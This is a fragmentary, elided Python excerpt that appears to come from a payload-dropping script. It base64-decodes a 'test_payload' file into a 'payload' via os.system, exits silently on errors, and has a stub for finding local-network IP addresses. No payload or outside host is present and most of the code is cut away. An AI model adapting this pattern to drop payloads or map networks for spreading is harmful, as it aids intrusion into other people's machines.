...
#payload_content = "f = open('{folder}/test_payload_exec','w')"
payload_content = "" # Hard code
...
def copy_payload():
	...
	try:
		...
		f.close()
		os.system(f"base64 -d {folder}/test_payload > {folder}/payload")
	except:
		sys.exit(0)
...
def local_ip_finder():
	...
	#subprocess.run(f"echo 192.168.56 > {folder}/ip.txt", shell=True) # For testing purposes
